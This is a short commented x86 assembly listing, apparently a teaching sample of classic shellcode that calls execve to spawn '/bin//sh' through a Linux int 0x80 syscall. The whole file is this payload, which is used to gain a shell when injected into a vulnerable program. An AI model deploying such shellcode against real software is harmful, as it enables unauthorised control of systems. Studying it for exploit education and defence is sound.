BITS 32

; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax, eax      ; zero our eax
  push eax          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push eax          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  mov al, 11        ; syscall #11
  int 0x80          ; do it

